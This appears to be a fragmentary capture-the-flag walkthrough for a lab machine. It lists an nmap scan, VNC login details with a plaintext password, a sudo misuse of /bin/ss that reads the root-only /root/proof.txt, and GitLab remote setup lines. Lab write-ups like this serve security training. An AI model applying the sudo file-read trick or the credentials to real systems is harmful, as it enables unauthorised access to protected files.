...
# Enumeration
## NMAP
`sudo nmap -sV 10.10.164.10 --top-ports 1000`
```
...
```c
install vncviewer
// listener_add --addr 0.0.0.0:5901 --to 10.10.164.10:5901 --tcp
vncviewer 10.10.164.10:5901
pass: R3S3+rcH

//use  this command to spit out the flag
sudo /bin/ss -a -F /root/proof.txt
...
```
cd existing_repo
git remote add origin http://cicd.lab.skylark.com/skylark-rd/scratchpad.git
git branch -M main
...
- [ ] [Set up project integrations](http://cicd.lab.skylark.com/skylark-rd/scratchpad/-/settings/integrations)
